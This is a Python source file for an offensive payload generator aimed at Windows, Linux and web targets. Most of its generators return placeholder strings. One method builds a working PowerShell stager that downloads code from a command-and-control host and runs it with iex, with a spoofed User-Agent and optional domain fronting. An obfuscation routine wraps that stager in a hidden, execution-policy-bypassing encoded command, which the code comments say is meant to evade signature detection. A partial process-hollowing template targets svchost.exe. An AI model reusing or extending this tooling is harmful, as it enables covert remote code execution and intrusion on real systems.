import os
import base64
import random
import string
from typing import Dict, List, Optional

class PayloadGenerator:
    """Generates various types of payloads for different platforms"""
    
    def __init__(self):
        self.payload_templates = {
            'windows': {
                'exe': self._generate_windows_exe,
                'dll': self._generate_windows_dll,
                'powershell': self._generate_powershell,
                'hta': self._generate_hta,
                'macro': self._generate_office_macro
            },
            'linux': {
                'elf': self._generate_linux_elf,
                'shell': self._generate_shell_script,
                'shared': self._generate_shared_object
            },
            'web': {
                'php': self._generate_php,
                'jsp': self._generate_jsp,
                'asp': self._generate_asp
            }
        }
    
    def generate_payload(self, platform: str, payload_type: str, c2_host: str, 
                        c2_port: int, obfuscate: bool = False, front_host: str = "") -> str:
        """Generate a payload for the specified platform and type"""
        if platform not in self.payload_templates:
            raise ValueError(f"Unsupported platform: {platform}")
        
        if payload_type not in self.payload_templates[platform]:
            raise ValueError(f"Unsupported payload type: {payload_type}")
        
        generator = self.payload_templates[platform][payload_type]
        payload = generator(c2_host, c2_port, front_host)
        
        if obfuscate:
            payload = self._obfuscate_payload(payload, platform)
        
        return payload
    
    def _generate_windows_exe(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a Windows executable payload"""
        # This would typically use a tool like msfvenom or custom shellcode
        # For now, return a placeholder
        return f"Windows EXE payload connecting to {c2_host}:{c2_port}"
    
    def _generate_windows_dll(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a Windows DLL payload"""
        return f"Windows DLL payload connecting to {c2_host}:{c2_port}"
    
    def _generate_hta(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a Windows HTA payload"""
        return f"Windows HTA payload connecting to {c2_host}:{c2_port}"
    
    def _generate_office_macro(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a Windows Office Macro payload"""
        return f"Windows Office Macro payload connecting to {c2_host}:{c2_port}"
    
    def _generate_linux_elf(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a Linux ELF payload"""
        return f"Linux ELF payload connecting to {c2_host}:{c2_port}"
    
    def _generate_shell_script(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a Linux shell script payload"""
        return f"Linux shell script payload connecting to {c2_host}:{c2_port}"
    
    def _generate_shared_object(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a Linux shared object (.so) payload"""
        return f"Linux shared object payload connecting to {c2_host}:{c2_port}"
    
    def _generate_php(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a PHP web shell payload"""
        return f"PHP web shell payload connecting to {c2_host}:{c2_port}"
    
    def _generate_jsp(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a JSP web shell payload"""
        return f"JSP web shell payload connecting to {c2_host}:{c2_port}"
    
    def _generate_asp(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate an ASP web shell payload"""
        return f"ASP web shell payload connecting to {c2_host}:{c2_port}"

    def _generate_powershell(self, c2_host: str, c2_port: int, front_host: str = "") -> str:
        """Generate a hardened PowerShell stager with domain fronting support"""
        host_header = f'$c.Headers.Add("Host", "{front_host}");' if front_host else ""
        # Base64 encoded stager that connects back
        stager = f"""
        $c = New-Object System.Net.WebClient;
        $c.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0");
        {host_header}
        $u = "http://{c2_host}:{c2_port}/collect?aid=" + [Guid]::NewGuid().ToString();
        iex ($c.DownloadString($u));
        """
        return stager

    def _obfuscate_payload(self, payload: str, platform: str) -> str:
        """Advanced obfuscation using Base64 and string manipulation"""
        if platform == 'windows':
            # Wrap in a Base64-encoded PowerShell execution to bypass signature-based detection
            b64_payload = base64.b64encode(payload.encode('utf-16le')).decode()
            obfuscated = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {b64_payload}"
            return obfuscated
        
        return payload

    def generate_hollowing_stager(self, target_process: str = "svchost.exe") -> str:
        """Generate a stager for Process Hollowing (Generic Template)"""
        # This generates a PowerShell script that uses inline C# to perform Process Hollowing
        # It creates target_process in a suspended state, hollows it, and injects our beacon
        stager = f"""
        $code = @"
        using System;
        using System.Runtime.InteropServices;
        public class Hollow {{
            [DllImport("kernel32.dll")]
            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, byte[] lpProcessInformation);
            // ... (Additional Native API imports for hollowing: NtUnmapViewOfSection, VirtualAllocEx, WriteProcessMemory, ResumeThread)
        }}
"@
        # This is a template for the actual implementation in Tier 4
        Write-Host "Process Hollowing Stager for {target_process} Generated."
        """
        return stager